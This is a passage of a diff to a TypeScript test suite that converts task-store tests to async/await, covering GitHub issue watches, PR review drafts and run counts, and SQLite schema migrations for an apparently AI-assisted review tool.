@@ -4035,44 +4309,44 @@ describe("issue watch store methods", () => {
 			topic: "github issue",
 			queuedAt: null,
 		});
-		expect(store.getIssueWatch(7)).toEqual({
+		expect(await store.getIssueWatch(7)).toEqual({
 			number: 7,
 			taskId: card.id,
 			labelled: false,
 			filedAt: 1000,
 		});
-		expect(store.getIssueWatch(8)).toBeNull();
+		expect(await store.getIssueWatch(8)).toBeNull();
 	});
 
-	test("a second fileIssueCard for the same number throws and leaves no extra card", () => {
-		const store = open(join(root, "issue-dup"));
+	test("a second fileIssueCard for the same number throws and leaves no extra card", async () => {
+		const store = await open(join(root, "issue-dup"));
 		const o = { number: 3, title: "t", prompt: "p", now: 1 };
-		store.fileIssueCard(o);
-		const before = store.listTasks().length;
-		expect(() => store.fileIssueCard({ ...o, now: 2 })).toThrow();
-		expect(store.listTasks()).toHaveLength(before);
-		expect(store.getIssueWatch(3)?.filedAt).toBe(1);
+		await store.fileIssueCard(o);
+		const before = (await store.listTasks()).length;
+		await expect(store.fileIssueCard({ ...o, now: 2 })).rejects.toThrow();
+		expect(await store.listTasks()).toHaveLength(before);
+		expect((await store.getIssueWatch(3))?.filedAt).toBe(1);
 	});
 
-	test("issueCardsFiledSince counts rows filed at or after since", () => {
-		const store = open(join(root, "issue-since"));
-		store.fileIssueCard({ number: 1, title: "a", prompt: "a", now: 100 });
-		store.fileIssueCard({ number: 2, title: "b", prompt: "b", now: 200 });
-		store.fileIssueCard({ number: 3, title: "c", prompt: "c", now: 300 });
-		expect(store.issueCardsFiledSince(200)).toBe(2);
-		expect(store.issueCardsFiledSince(201)).toBe(1);
-		expect(store.issueCardsFiledSince(0)).toBe(3);
-		expect(store.issueCardsFiledSince(301)).toBe(0);
+	test("issueCardsFiledSince counts rows filed at or after since", async () => {
+		const store = await open(join(root, "issue-since"));
+		await store.fileIssueCard({ number: 1, title: "a", prompt: "a", now: 100 });
+		await store.fileIssueCard({ number: 2, title: "b", prompt: "b", now: 200 });
+		await store.fileIssueCard({ number: 3, title: "c", prompt: "c", now: 300 });
+		expect(await store.issueCardsFiledSince(200)).toBe(2);
+		expect(await store.issueCardsFiledSince(201)).toBe(1);
+		expect(await store.issueCardsFiledSince(0)).toBe(3);
+		expect(await store.issueCardsFiledSince(301)).toBe(0);
 	});
 
-	test("unlabelledIssues lists ascending until markIssueLabelled", () => {
-		const store = open(join(root, "issue-label"));
-		store.fileIssueCard({ number: 9, title: "a", prompt: "a", now: 1 });
-		store.fileIssueCard({ number: 4, title: "b", prompt: "b", now: 1 });
-		expect(store.unlabelledIssues()).toEqual([4, 9]);
-		store.markIssueLabelled(4);
-		expect(store.unlabelledIssues()).toEqual([9]);
-		expect(store.getIssueWatch(4)?.labelled).toBe(true);
+	test("unlabelledIssues lists ascending until markIssueLabelled", async () => {
+		const store = await open(join(root, "issue-label"));
+		await store.fileIssueCard({ number: 9, title: "a", prompt: "a", now: 1 });
+		await store.fileIssueCard({ number: 4, title: "b", prompt: "b", now: 1 });
+		expect(await store.unlabelledIssues()).toEqual([4, 9]);
+		await store.markIssueLabelled(4);
+		expect(await store.unlabelledIssues()).toEqual([9]);
+		expect((await store.getIssueWatch(4))?.labelled).toBe(true);
 	});
 });
 
@@ -4094,38 +4368,43 @@ describe("pr review store methods", () => {
 		commentsUnseen: false,
 	};
 
-	test("prReviews defaults to false", () => {
+	test("prReviews defaults to false", async () => {
 		expect(DEFAULT_SETTINGS.prReviews).toBe(false);
-		expect(open(join(root, "pr-settings")).getSettings().prReviews).toBe(false);
+		expect(
+			(await (await open(join(root, "pr-settings"))).getSettings()).prReviews,
+		).toBe(false);
 	});
 
-	test("prMode defaults to false and persists across reopen", () => {
+	test("prMode defaults to false and persists across reopen", async () => {
 		expect(DEFAULT_SETTINGS.prMode).toBe(false);
-		const store = open(join(root, "pr-mode"));
-		expect(store.getSettings().prMode).toBe(false);
-		store.setSettings({ prMode: true });
-		expect(store.getSettings().prMode).toBe(true);
-		store.close();
-		expect(open(join(root, "pr-mode")).getSettings().prMode).toBe(true);
+		const store = await open(join(root, "pr-mode"));
+		expect((await store.getSettings()).prMode).toBe(false);
+		await store.setSettings({ prMode: true });
+		expect((await store.getSettings()).prMode).toBe(true);
+		await store.close();
+		expect(
+			(await (await open(join(root, "pr-mode"))).getSettings()).prMode,
+		).toBe(true);
 	});
 
-	test("prReviewApprove defaults to false and persists across reopen", () => {
+	test("prReviewApprove defaults to false and persists across reopen", async () => {
 		expect(DEFAULT_SETTINGS.prReviewApprove).toBe(false);
-		const store = open(join(root, "pr-approve"));
-		expect(store.getSettings().prReviewApprove).toBe(false);
-		store.setSettings({ prReviewApprove: true });
-		expect(store.getSettings().prReviewApprove).toBe(true);
-		store.close();
-		expect(open(join(root, "pr-approve")).getSettings().prReviewApprove).toBe(
-			true,
-		);
+		const store = await open(join(root, "pr-approve"));
+		expect((await store.getSettings()).prReviewApprove).toBe(false);
+		await store.setSettings({ prReviewApprove: true });
+		expect((await store.getSettings()).prReviewApprove).toBe(true);
+		await store.close();
+		expect(
+			(await (await open(join(root, "pr-approve"))).getSettings())
+				.prReviewApprove,
+		).toBe(true);
 	});
 
-	test("savePrReview upserts by number and round-trips booleans and nulls", () => {
-		const store = open(join(root, "pr-row"));
-		expect(store.getPrReview(12)).toBeNull();
-		store.savePrReview(row);
-		expect(store.getPrReview(12)).toEqual(row);
+	test("savePrReview upserts by number and round-trips booleans and nulls", async () => {
+		const store = await open(join(root, "pr-row"));
+		expect(await store.getPrReview(12)).toBeNull();
+		await store.savePrReview(row);
+		expect(await store.getPrReview(12)).toEqual(row);
 		const changed = {
 			...row,
 			taskId: "T-1",
@@ -4141,26 +4420,26 @@ describe("pr review store methods", () => {
 			commentsAt: null,
 			commentsUnseen: false,
 		};
-		store.savePrReview(changed);
-		store.savePrReview({ ...row, number: 3 });
-		expect(store.getPrReview(12)).toEqual(changed);
-		expect(store.listPrReviews().map((r) => r.number)).toEqual([3, 12]);
-		expect(store.getPrReviewByTask("T-1")).toEqual(changed);
-		expect(store.getPrReviewByTask("T-2")).toBeNull();
+		await store.savePrReview(changed);
+		await store.savePrReview({ ...row, number: 3 });
+		expect(await store.getPrReview(12)).toEqual(changed);
+		expect((await store.listPrReviews()).map((r) => r.number)).toEqual([3, 12]);
+		expect(await store.getPrReviewByTask("T-1")).toEqual(changed);
+		expect(await store.getPrReviewByTask("T-2")).toBeNull();
 	});
 
-	test("prReviewRunsSince counts attempts at or after the bound", () => {
-		const store = open(join(root, "pr-runs"));
-		store.startPrRun(12, "a", 1000);
-		store.startPrRun(12, "b", 2000);
-		expect(store.prReviewRunsSince(2000)).toBe(1);
-		expect(store.prReviewRunsSince(2001)).toBe(0);
-		expect(store.prReviewRunsSince(1000)).toBe(2);
+	test("prReviewRunsSince counts attempts at or after the bound", async () => {
+		const store = await open(join(root, "pr-runs"));
+		await store.startPrRun(12, "a", 1000);
+		await store.startPrRun(12, "b", 2000);
+		expect(await store.prReviewRunsSince(2000)).toBe(1);
+		expect(await store.prReviewRunsSince(2001)).toBe(0);
+		expect(await store.prReviewRunsSince(1000)).toBe(2);
 	});
 
-	test("lastPrRunAt gives the latest done run's start per head and ignores undone runs", () => {
-		const store = open(join(root, "pr-last-run"));
-		store.savePrReview({
+	test("lastPrRunAt gives the latest done run's start per head and ignores undone runs", async () => {
+		const store = await open(join(root, "pr-last-run"));
+		await store.savePrReview({
 			number: 12,
 			taskId: null,
 			head: "abc",
@@ -4176,11 +4455,11 @@ describe("pr review store methods", () => {
 			commentsAt: null,
 			commentsUnseen: false,
 		});
-		const run1 = store.startPrRun(12, "abc", 1000);
-		store.startPrRun(12, "abc", 500);
+		const run1 = await store.startPrRun(12, "abc", 1000);
+		await store.startPrRun(12, "abc", 500);
 		// A failed attempt counts for the cap but is not a review yet.
-		expect(store.lastPrRunAt(12, "abc")).toBeNull();
-		store.savePrDraft({
+		expect(await store.lastPrRunAt(12, "abc")).toBeNull();
+		await store.savePrDraft({
 			run: run1,
 			number: 12,
 			head: "abc",
@@ -4188,13 +4467,13 @@ describe("pr review store methods", () => {
 			prompt: "p",
 			blocking: true,
 		});
-		expect(store.lastPrRunAt(12, "abc")).toBe(1000);
-		expect(store.lastPrRunAt(12, "xyz")).toBeNull();
+		expect(await store.lastPrRunAt(12, "abc")).toBe(1000);
+		expect(await store.lastPrRunAt(12, "xyz")).toBeNull();
 	});
 
-	test("savePrDraft files one waiting card, then updates the same card; only saved heads count as reviewed", () => {
-		const store = open(join(root, "pr-draft"));
-		expect(() =>
+	test("savePrDraft files one waiting card, then updates the same card; only saved heads count as reviewed", async () => {
+		const store = await open(join(root, "pr-draft"));
+		await expect(
 			store.savePrDraft({
 				run: 1,
 				number: 9,
@@ -4203,12 +4482,16 @@ describe("pr review store methods", () => {
 				prompt: "p",
 				blocking: true,
 			}),
-		).toThrow();
-		store.savePrReview({ ...row, title: "Fix the thing", postError: "old" });
-		const run1 = store.startPrRun(12, "abc", 50);
+		).rejects.toThrow();
+		await store.savePrReview({
+			...row,
+			title: "Fix the thing",
+			postError: "old",
+		});
+		const run1 = await store.startPrRun(12, "abc", 50);
 		// A failed attempt counts for the cap but leaves the head open for a retry.
-		expect(store.prHeadReviewed(12, "abc")).toBe(false);
-		const card = store.savePrDraft({
+		expect(await store.prHeadReviewed(12, "abc")).toBe(false);
+		const card = await store.savePrDraft({
 			run: run1,
 			number: 12,
 			head: "abc",
@@ -4226,17 +4509,17 @@ describe("pr review store methods", () => {
 		);
 		expect(card.details).toBe("## Summary\nok");
 		expect(card.topic).toBe("pr review");
-		expect(store.prHeadReviewed(12, "abc")).toBe(true);
-		expect(store.getPrReview(12)).toMatchObject({
+		expect(await store.prHeadReviewed(12, "abc")).toBe(true);
+		expect(await store.getPrReview(12)).toMatchObject({
 			taskId: card.id,
 			reviewedHead: "abc",
 			postError: null,
 		});
 
 		// The watcher wrote a newer state during the model call: the draft save keeps it.
-		store.setPrState(12, "merged");
-		const again = store.savePrDraft({
-			run: store.startPrRun(12, "def", 60),
+		await store.setPrState(12, "merged");
+		const again = await store.savePrDraft({
+			run: await store.startPrRun(12, "def", 60),
 			number: 12,
 			head: "def",
 			draft: "second",
@@ -4246,23 +4529,23 @@ describe("pr review store methods", () => {
 		expect(again.id).toBe(card.id);
 		expect(again.details).toBe("second");
 		expect(again.prompt).toBe("review 2");
-		expect(store.listTasks()).toHaveLength(1);
+		expect(await store.listTasks()).toHaveLength(1);
 		// A merged PR has nothing left to post.
 		expect(again.stage).toBe("done");
 		expect(again.state).toBe("idle");
 		expect(again.needsReason).toBeNull();
-		expect(store.getPrReview(12)).toMatchObject({
+		expect(await store.getPrReview(12)).toMatchObject({
 			reviewedHead: "def",
 			state: "merged",
 		});
-		expect(store.prReviewRunsSince(0)).toBe(2);
+		expect(await store.prReviewRunsSince(0)).toBe(2);
 	});
 
-	test("syncPrCard places the card from its row and writes only on a difference", () => {
-		const store = open(join(root, "pr-sync"));
-		store.savePrReview(row);
-		const card = store.savePrDraft({
-			run: store.startPrRun(12, "abc", 1),
+	test("syncPrCard places the card from its row and writes only on a difference", async () => {
+		const store = await open(join(root, "pr-sync"));
+		await store.savePrReview(row);
+		const card = await store.savePrDraft({
+			run: await store.startPrRun(12, "abc", 1),
 			number: 12,
 			head: "abc",
 			draft: "d",
@@ -4271,9 +4554,12 @@ describe("pr review store methods", () => {
 		});
 		expect(card.state).toBe("needs_you");
 		// Posted head: done/idle, done_at stamped once.
-		store.savePrReview({ ...store.getPrReview(12)!, postedHead: "abc" });
-		store.syncPrCard(12);
-		const done = store.getTask(card.id)!;
+		await store.savePrReview({
+			...(await store.getPrReview(12))!,
+			postedHead: "abc",
+		});
+		await store.syncPrCard(12);
+		const done = (await store.getTask(card.id))!;
 		expect(done).toMatchObject({
 			stage: "done",
 			state: "idle",
@@ -4281,13 +4567,13 @@ describe("pr review store methods", () => {
 		});
 		expect(done.doneAt).not.toBeNull();
 		Bun.sleepSync(5);
-		store.syncPrCard(12);
-		const same = store.getTask(card.id)!;
+		await store.syncPrCard(12);
+		const same = (await store.getTask(card.id))!;
 		expect(same.doneAt).toBe(done.doneAt);
 		expect(same.updatedAt).toBe(done.updatedAt);
 		// A new head's draft on the posted card waits again.
-		const again = store.savePrDraft({
-			run: store.startPrRun(12, "def", 2),
+		const again = await store.savePrDraft({
+			run: await store.startPrRun(12, "def", 2),
 			number: 12,
 			head: "def",
 			draft: "d2",
@@ -4296,35 +4582,35 @@ describe("pr review store methods", () => {
 		});
 		expect(again).toMatchObject({ stage: "in_progress", state: "needs_you" });
 		// Closed: done/idle.
-		store.setPrState(12, "closed");
-		store.syncPrCard(12);
-		expect(store.getTask(card.id)).toMatchObject({
+		await store.setPrState(12, "closed");
+		await store.syncPrCard(12);
+		expect(await store.getTask(card.id)).toMatchObject({
 			stage: "done",
 			state: "idle",
 		});
 		// Reopened: waits again.
-		store.setPrState(12, "open");
-		store.syncPrCard(12);
-		expect(store.getTask(card.id)).toMatchObject({
+		await store.setPrState(12, "open");
+		await store.syncPrCard(12);
+		expect(await store.getTask(card.id)).toMatchObject({
 			stage: "in_progress",
 			state: "needs_you",
 		});
 		// A cancelled card stays as it is.
-		store.updateTask(card.id, { cancelledAt: 5 });
-		store.setPrState(12, "merged");
-		store.syncPrCard(12);
-		expect(store.getTask(card.id)).toMatchObject({
+		await store.updateTask(card.id, { cancelledAt: 5 });
+		await store.setPrState(12, "merged");
+		await store.syncPrCard(12);
+		expect(await store.getTask(card.id)).toMatchObject({
 			stage: "in_progress",
 			state: "needs_you",
 		});
 		// No card: no throw, no write.
-		store.savePrReview({ ...row, number: 13 });
-		store.syncPrCard(13);
-		store.syncPrCard(99);
-		expect(store.listTasks()).toHaveLength(1);
+		await store.savePrReview({ ...row, number: 13 });
+		await store.syncPrCard(13);
+		await store.syncPrCard(99);
+		expect(await store.listTasks()).toHaveLength(1);
 	});
 
-	test("an old database gains the pr_review tables on open, same shape as fresh", () => {
+	test("an old database gains the pr_review tables on open, same shape as fresh", async () => {
 		const dir = join(root, "pr-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4332,12 +4618,12 @@ describe("pr review store methods", () => {
 			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
 		);
 		old.close();
-		const store = open(dir);
-		store.savePrReview(row);
-		expect(store.getPrReview(12)).toEqual(row);
-		store.close();
+		const store = await open(dir);
+		await store.savePrReview(row);
+		expect(await store.getPrReview(12)).toEqual(row);
+		await store.close();
 
-		open(join(root, "pr-migration-fresh")).close();
+		await (await open(join(root, "pr-migration-fresh"))).close();
 		const ddl = (path: string) => {
 			const db = new Database(join(path, ".tasks", "tasks.db"));
 			const sql = db
@@ -4356,7 +4642,7 @@ describe("pr review store methods", () => {
 		expect(migrated).toEqual(ddl(join(root, "pr-migration-fresh")));
 	});
 
-	test("a pre-posted_url pr_review converges on open and setPrPostedUrl round-trips", () => {
+	test("a pre-posted_url pr_review converges on open and setPrPostedUrl round-trips", async () => {
 		const dir = join(root, "pr-posted-url");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4379,19 +4665,19 @@ describe("pr review store methods", () => {
 			"INSERT INTO pr_review (number, head, first_seen_at, state, draft, title) VALUES (7, 'abc', 1, 'open', 0, 'Old row')",
 		);
 		old.close();
-		const store = open(dir);
-		expect(store.getPrReview(7)).toMatchObject({ postedUrl: null });
+		const store = await open(dir);
+		expect(await store.getPrReview(7)).toMatchObject({ postedUrl: null });
 		const url = "https://github.com/acme/widget/pull/7#pullrequestreview-2";
-		store.setPrPostedUrl(7, url, "ottr[bot]");
-		expect(store.getPrReview(7)?.postedUrl).toBe(url);
-		expect(store.getPrReview(7)?.postedLogin).toBe("ottr[bot]");
-		store.setPrPostedUrl(7, null);
-		expect(store.getPrReview(7)?.postedUrl).toBeNull();
-		expect(store.getPrReview(7)?.postedLogin).toBeNull();
-		store.close();
+		await store.setPrPostedUrl(7, url, "ottr[bot]");
+		expect((await store.getPrReview(7))?.postedUrl).toBe(url);
+		expect((await store.getPrReview(7))?.postedLogin).toBe("ottr[bot]");
+		await store.setPrPostedUrl(7, null);
+		expect((await store.getPrReview(7))?.postedUrl).toBeNull();
+		expect((await store.getPrReview(7))?.postedLogin).toBeNull();
+		await store.close();
 	});
 
-	test("a pre-posted_login pr_review (with posted_url) converges on open and setPrPostedUrl round-trips", () => {
+	test("a pre-posted_login pr_review (with posted_url) converges on open and setPrPostedUrl round-trips", async () => {
 		const dir = join(root, "pr-posted-login");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4415,22 +4701,22 @@ describe("pr review store methods", () => {
 			"INSERT INTO pr_review (number, head, first_seen_at, posted_head, posted_url, state, draft, title) VALUES (7, 'abc', 1, 'abc', 'https://github.com/acme/widget/pull/7#pullrequestreview-2', 'open', 0, 'Old row')",
 		);
 		old.close();
-		const store = open(dir);
-		expect(store.getPrReview(7)).toMatchObject({
+		const store = await open(dir);
+		expect(await store.getPrReview(7)).toMatchObject({
 			postedUrl: "https://github.com/acme/widget/pull/7#pullrequestreview-2",
 			postedLogin: null,
 		});
-		store.setPrPostedUrl(7, null, "octocat");
-		expect(store.getPrReview(7)?.postedLogin).toBe("octocat");
-		store.setPrPostedUrl(7, null);
-		expect(store.getPrReview(7)).toMatchObject({
+		await store.setPrPostedUrl(7, null, "octocat");
+		expect((await store.getPrReview(7))?.postedLogin).toBe("octocat");
+		await store.setPrPostedUrl(7, null);
+		expect(await store.getPrReview(7)).toMatchObject({
 			postedUrl: null,
 			postedLogin: null,
 		});
-		store.close();
+		await store.close();
 	});
 
-	test("a pre-hold fork_branch converges on open and keeps its rows", () => {
+	test("a pre-hold fork_branch converges on open and keeps its rows", async () => {
 		const dir = join(root, "fork-branch-hold");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4453,16 +4739,16 @@ describe("pr review store methods", () => {
 			"INSERT INTO fork_branch (fork_id, branch_hash, branch, head, analyzed_head) VALUES (1, 'h', 'feat', 'b', 'a')",
 		);
 		old.close();
-		const store = open(dir);
+		const store = await open(dir);
 		// The retired columns converge additively; the row reads with no hold state.
-		expect(store.listForkBranches(1)[0]).toMatchObject({
+		expect((await store.listForkBranches(1))[0]).toMatchObject({
 			head: "b",
 			analyzedHead: "a",
 		});
-		store.close();
+		await store.close();
 	});
 
-	test("a legacy hold_prs row converts into fork_hold rows on open", () => {
+	test("a legacy hold_prs row converts into fork_hold rows on open", async () => {
 		const dir = join(root, "fork-branch-hold-legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4491,10 +4777,10 @@ describe("pr review store methods", () => {
 			"INSERT INTO fork_branch (fork_id, branch_hash, branch, head, analyzed_head, hold_prs) VALUES (2, 'i', 'dev', 'c', NULL, 'not json')",
 		);
 		old.close();
-		const store = open(dir);
+		const store = await open(dir);
 		// Each legacy entry held its PR head: the head sha seeds the per-commit hold
 		// row, and the watcher expands the PR's other held commits when it resolves.
-		expect(store.listForkHolds(1)).toEqual([
+		expect(await store.listForkHolds(1)).toEqual([
 			{
 				forkId: 1,
 				branchHash: "h",
@@ -4504,9 +4790,9 @@ describe("pr review store methods", () => {
 				released: 0,
 			},
 		]);
-		expect(store.listForkHolds(2)).toEqual([]);
+		expect(await store.listForkHolds(2)).toEqual([]);
 		// The retired columns are cleared, so the conversion never runs twice.
-		store.close();
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		const row = raw
 			.query<{ hold_prs: string | null; hold_base: string | null }, []>(
@@ -4533,7 +4819,7 @@ describe("pr review store methods", () => {
 		return { cols, indexes };
 	};
 
-	test("a first-release pr_review_runs without head converges on open and the run methods work", () => {
+	test("a first-release pr_review_runs without head converges on open and the run methods work", async () => {
 		const dir = join(root, "pr-runs-no-head");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4546,14 +4832,14 @@ describe("pr review store methods", () => {
 )`);
 		old.run("INSERT INTO pr_review_runs (number, started_at) VALUES (7, 1000)");
 		old.close();
-		const store = open(dir);
+		const store = await open(dir);
 		// The headless first-release row cannot satisfy head NOT NULL and drops; it only
 		// held the daily rate-limit window. The rebuilt table serves the run methods again.
-		expect(store.prReviewRunsSince(0)).toBe(0);
-		store.savePrReview({ ...row, number: 7 });
-		const run = store.startPrRun(7, "abc", 2000);
-		expect(store.prHeadReviewed(7, "abc")).toBe(false);
-		store.savePrDraft({
+		expect(await store.prReviewRunsSince(0)).toBe(0);
+		await store.savePrReview({ ...row, number: 7 });
+		const run = await store.startPrRun(7, "abc", 2000);
+		expect(await store.prHeadReviewed(7, "abc")).toBe(false);
+		await store.savePrDraft({
 			run,
 			number: 7,
 			head: "abc",
@@ -4561,8 +4847,8 @@ describe("pr review store methods", () => {
 			prompt: "p",
 			blocking: true,
 		});
-		expect(store.prHeadReviewed(7, "abc")).toBe(true);
-		store.close();
+		expect(await store.prHeadReviewed(7, "abc")).toBe(true);
+		await store.close();
 		const shape = runShape(dir);
 		expect(shape.cols).toEqual([
 			"id",
@@ -4575,7 +4861,7 @@ describe("pr review store methods", () => {
 		expect(shape.indexes).toContain("idx_pr_review_runs_at");
 	});
 
-	test("a head-era pr_review_runs without id and done keeps its rows through the rebuild", () => {
+	test("a head-era pr_review_runs without id and done keeps its rows through the rebuild", async () => {
 		const dir = join(root, "pr-runs-head-era");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4594,14 +4880,14 @@ describe("pr review store methods", () => {
 			"INSERT INTO pr_review_runs (number, started_at, head) VALUES (8, 2000, 'def')",
 		);
 		old.close();
-		const store = open(dir);
+		const store = await open(dir);
 		// That build wrote each row after its review finished, so the copy counts the old
 		// heads as reviewed and keeps the daily-cap window.
-		expect(store.prReviewRunsSince(0)).toBe(2);
-		expect(store.prReviewRunsSince(1500)).toBe(1);
-		expect(store.prHeadReviewed(7, "abc")).toBe(true);
-		expect(store.prHeadReviewed(8, "xyz")).toBe(false);
-		store.close();
+		expect(await store.prReviewRunsSince(0)).toBe(2);
+		expect(await store.prReviewRunsSince(1500)).toBe(1);
+		expect(await store.prHeadReviewed(7, "abc")).toBe(true);
+		expect(await store.prHeadReviewed(8, "xyz")).toBe(false);
+		await store.close();
 		const shape = runShape(dir);
 		expect(shape.cols).toEqual([
 			"id",
@@ -4613,7 +4899,7 @@ describe("pr review store methods", () => {
 		]);
 	});
 
-	test("a pre-blocking pr_review_runs gains the column on open and old runs read as blocking", () => {
+	test("a pre-blocking pr_review_runs gains the column on open and old runs read as blocking", async () => {
 		const dir = join(root, "pr-runs-no-blocking");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4631,13 +4917,13 @@ describe("pr review store methods", () => {
 			"INSERT INTO pr_review_runs (number, started_at, head, done) VALUES (7, 1000, 'abc', 1)",
 		);
 		old.close();
-		const store = open(dir);
+		const store = await open(dir);
 		// The column lands additively with its default, so the unrecorded verdict reads as
 		// blocking and an approval needs a run that saved a clean one.
-		expect(store.lastPrRunBlocking(7)).toBe(true);
-		store.savePrReview({ ...row, number: 7 });
-		const run = store.startPrRun(7, "abc", 2000);
-		store.savePrDraft({
+		expect(await store.lastPrRunBlocking(7)).toBe(true);
+		await store.savePrReview({ ...row, number: 7 });
+		const run = await store.startPrRun(7, "abc", 2000);
+		await store.savePrDraft({
 			run,
 			number: 7,
 			head: "abc",
@@ -4645,8 +4931,8 @@ describe("pr review store methods", () => {
 			prompt: "p",
 			blocking: false,
 		});
-		expect(store.lastPrRunBlocking(7)).toBe(false);
-		store.close();
+		expect(await store.lastPrRunBlocking(7)).toBe(false);
+		await store.close();
 		const shape = runShape(dir);
 		expect(shape.cols).toEqual([
 			"id",
@@ -4658,25 +4944,25 @@ describe("pr review store methods", () => {
 		]);
 	});
 
-	test("lastPrRunBlocking reads the newest done run's verdict and defaults to blocking", () => {
-		const store = open(join(root, "pr-runs-verdict"));
+	test("lastPrRunBlocking reads the newest done run's verdict and defaults to blocking", async () => {
+		const store = await open(join(root, "pr-runs-verdict"));
 		// No runs at all.
-		expect(store.lastPrRunBlocking(12)).toBe(true);
-		store.startPrRun(12, "abc", 1000);
+		expect(await store.lastPrRunBlocking(12)).toBe(true);
+		await store.startPrRun(12, "abc", 1000);
 		// An un-done run has no verdict yet.
-		expect(store.lastPrRunBlocking(12)).toBe(true);
-		store.savePrReview(row);
-		store.savePrDraft({
-			run: store.startPrRun(12, "abc", 1000),
+		expect(await store.lastPrRunBlocking(12)).toBe(true);
+		await store.savePrReview(row);
+		await store.savePrDraft({
+			run: await store.startPrRun(12, "abc", 1000),
 			number: 12,
 			head: "abc",
 			draft: "d",
 			prompt: "p",
 			blocking: false,
 		});
-		expect(store.lastPrRunBlocking(12)).toBe(false);
-		store.savePrDraft({
-			run: store.startPrRun(12, "abc", 2000),
+		expect(await store.lastPrRunBlocking(12)).toBe(false);
+		await store.savePrDraft({
+			run: await store.startPrRun(12, "abc", 2000),
 			number: 12,
 			head: "abc",
 			draft: "d2",
@@ -4684,38 +4970,41 @@ describe("pr review store methods", () => {
 			blocking: true,
 		});
 		// The newest done run wins.
-		expect(store.lastPrRunBlocking(12)).toBe(true);
-		store.close();
+		expect(await store.lastPrRunBlocking(12)).toBe(true);
+		await store.close();
 	});
 });
 
 describe("triage columns", () => {
-	test("updateTask persists priority and closeCandidate and null clears", () => {
-		const store = open(join(root, "triage"));
-		const task = store.createTask("rate me");
+	test("updateTask persists priority and closeCandidate and null clears", async () => {
+		const store = await open(join(root, "triage"));
+		const task = await store.createTask("rate me");
 		expect(task.priority).toBeNull();
 		expect(task.closeCandidate).toBeNull();
-		store.updateTask(task.id, { priority: "P1", closeCandidate: "dup of X" });
-		expect(store.getTask(task.id)?.priority).toBe("P1");
-		expect(store.getTask(task.id)?.closeCandidate).toBe("dup of X");
-		store.updateTask(task.id, { priority: null, closeCandidate: null });
-		expect(store.getTask(task.id)?.priority).toBeNull();
-		expect(store.getTask(task.id)?.closeCandidate).toBeNull();
-		store.close();
+		await store.updateTask(task.id, {
+			priority: "P1",
+			closeCandidate: "dup of X",
+		});
+		expect((await store.getTask(task.id))?.priority).toBe("P1");
+		expect((await store.getTask(task.id))?.closeCandidate).toBe("dup of X");
+		await store.updateTask(task.id, { priority: null, closeCandidate: null });
+		expect((await store.getTask(task.id))?.priority).toBeNull();
+		expect((await store.getTask(task.id))?.closeCandidate).toBeNull();
+		await store.close();
 
-		const reopened = open(join(root, "triage"));
-		expect(reopened.getTask(task.id)?.priority).toBeNull();
-		reopened.close();
+		const reopened = await open(join(root, "triage"));
+		expect((await reopened.getTask(task.id))?.priority).toBeNull();
+		await reopened.close();
 	});
 });
 
 describe("learnings", () => {
-	test("an old-shape database gains the triage columns and the learnings table on open", () => {
+	test("an old-shape database gains the triage columns and the learnings table on open", async () => {
 		const dir = join(root, "learnings-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		// Current TASKS_DDL: priority/close_candidate are ALTER-only, so it is already the old shape.
-		const ref = open(join(root, "learnings-schema-ref"));
-		ref.close();
+		const ref = await open(join(root, "learnings-schema-ref"));
+		await ref.close();
 		const refDb = new Database(
 			join(root, "learnings-schema-ref", ".tasks", "tasks.db"),
 		);
@@ -4741,14 +5030,14 @@ describe("learnings", () => {
 		);
 		db.close();
 
-		const store = open(dir);
+		const store = await open(dir);
 		// Rows survive; the new fields read as their null defaults.
-		const seed = store.getTask("seed1");
+		const seed = await store.getTask("seed1");
 		expect(seed?.title).toBe("old card");
 		expect(seed?.priority).toBeNull();
 		expect(seed?.closeCandidate).toBeNull();
 		// The retired learnings table still exists here; nothing reads or writes it.
-		store.close();
+		await store.close();
 		const reopened = new Database(join(dir, ".tasks", "tasks.db"));
 		expect(
 			reopened
@@ -4757,18 +5046,18 @@ describe("learnings", () => {
 				)
 				.get(),
 		).toBeTruthy();
-		reopened.close();
+		await reopened.close();
 	});
 });
 
 describe("push retries (OTTR-394)", () => {
-	test("a database created before push_retries converges on open and the field round-trips", () => {
+	test("a database created before push_retries converges on open and the field round-trips", async () => {
 		const dir = join(root, "push-retries-legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		// The tasks DDL of a fresh database minus the ALTER-only push_retries column: the
 		// shape every live database carried before this feature.
-		const ref = open(join(root, "push-retries-schema-ref"));
-		ref.close();
+		const ref = await open(join(root, "push-retries-schema-ref"));
+		await ref.close();
 		const refDb = new Database(
 			join(root, "push-retries-schema-ref", ".tasks", "tasks.db"),
 		);
@@ -4791,35 +5080,35 @@ describe("push retries (OTTR-394)", () => {
 		);
 		db.close();
 
-		const store = open(dir);
-		expect(store.getTask("seed1")?.pushRetries).toBe(0);
-		store.updateTask("seed1", { pushRetries: 2 });
-		expect(store.getTask("seed1")?.pushRetries).toBe(2);
-		store.close();
-		const reopened = open(dir);
-		expect(reopened.getTask("seed1")?.pushRetries).toBe(2);
-		reopened.close();
+		const store = await open(dir);
+		expect((await store.getTask("seed1"))?.pushRetries).toBe(0);
+		await store.updateTask("seed1", { pushRetries: 2 });
+		expect((await store.getTask("seed1"))?.pushRetries).toBe(2);
+		await store.close();
+		const reopened = await open(dir);
